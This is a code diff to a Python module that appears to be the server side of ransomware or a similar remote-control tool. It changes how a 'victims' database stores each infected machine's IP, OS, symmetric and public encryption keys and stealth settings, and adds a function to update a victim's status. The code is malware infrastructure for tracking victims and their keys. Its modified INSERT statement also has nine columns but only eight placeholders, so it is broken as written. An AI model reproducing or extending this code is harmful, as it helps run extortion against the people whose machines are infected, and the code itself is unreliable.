@@ -103,17 +103,29 @@ def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
     #Update du client en bdd
     if len(myresult) > 0:
         print("\t(+) client updated in database")
-        query = "UPDATE victims SET ip = %s, os = %s, sym_key = %s, pub_key = %s, updated_at = %s WHERE uid = %s"
-        values = (ip, os, base64.b64encode(sym_key).decode(), base64.b64encode(pub_key.encode()).decode(), datetime.now(), uid)
+        
+        query = "UPDATE victims SET ip = %s, os = %s, status = %s, sym_key = %s, pub_key = %s, updated_at = %s WHERE uid = %s"
+        values = (ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode(pub_key.encode()).decode(), datetime.now(), uid)
 
         mycursor.execute(query, values)
 
     #Insert du client en bdd
     else:
         print("\t(+) client added in database")
-        query = "INSERT INTO victims (uid, ip, os, sym_key, pub_key, stealth, multi_thread, created_at) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
-        values = (uid, ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True, datetime.now())
-
+        query = "INSERT INTO victims (uid, ip, os, status, sym_key, pub_key, stealth, multi_thread, created_at) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
+        values = (uid, ip, os, 1, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True, datetime.now())
         mycursor.execute(query, values)
 
     db.commit()
+
+    
+def update_status(db, mycursor, uid):
+
+    #Update du client en bdd
+    print("\t(+) client updated in database")
+    query = "UPDATE victims SET status = %s WHERE uid = %s"
+    values = (0, uid)
+
+    mycursor.execute(query, values)
+
+    db.commit() 
